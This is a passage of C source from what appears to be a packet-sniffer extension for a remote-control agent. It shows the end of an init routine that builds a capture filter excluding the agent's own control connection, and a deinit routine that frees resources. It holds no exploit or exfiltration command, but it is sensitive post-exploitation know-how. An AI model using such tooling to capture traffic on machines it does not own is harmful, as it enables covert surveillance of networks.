	hMgr = NULL;
	hErr = 0;

	dprintf("[SERVER] Memory reset of include/exclude port lists...");
	// wipe the include/exclude ports empty
	memset(sniffer_includeports, 0, sizeof(sniffer_includeports));
	memset(sniffer_excludeports, 0, sizeof(sniffer_excludeports));
	sniffer_includeports[0] = -1;
	sniffer_excludeports[0] = -1;
#endif

	dprintf("[SERVER] Getting the peer name of our socket...");
	// get the address/port of the connected control socket
	peername4 = NULL;
	peername6 = NULL;
	peername_len = sizeof(peername);
	getpeername(remote->fd, &peername, &peername_len);
	if(peername.sa_family == PF_INET)  peername4 = (struct sockaddr_in *)&peername;

	dprintf("[SERVER] Getting the IPv6 peer name of our socket...");
	if(peername.sa_family == PF_INET6) peername6 = (struct sockaddr_in6 *)&peername;

	dprintf("[SERVER] Creating a lock...");
	snifferm = lock_create();

#ifdef _WIN32
	return hErr;
#else
	if(peername4 || peername6) {
		int port;
		char buf[256];		// future proof :-)

		memset(buf, 0, sizeof(buf));

		if(peername4) {
			inet_ntop(AF_INET, &peername4->sin_addr, buf, sizeof(buf)-1);
			port = ntohs(peername4->sin_port);
		} else {
			inet_ntop(AF_INET6, &peername6->sin6_addr, buf, sizeof(buf)-1);
			port = ntohs(peername6->sin6_port);
		}

		asprintf(&packet_filter, "not (ip%s host %s and tcp port %d)", peername4 ? "" : "6", buf, port);
		dprintf("so our filter is '%s'", packet_filter);
	} else {
		dprintf("hold on to your seats. no filter applied :~(");
	}

	return ERROR_SUCCESS;
#endif

}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

#ifdef _WIN32
	MgrDestroy(hMgr);
#else
	if(packet_filter) {
		free(packet_filter);
		packet_filter = NULL;
	}
#endif

	lock_destroy(snifferm);
	return ERROR_SUCCESS;
}
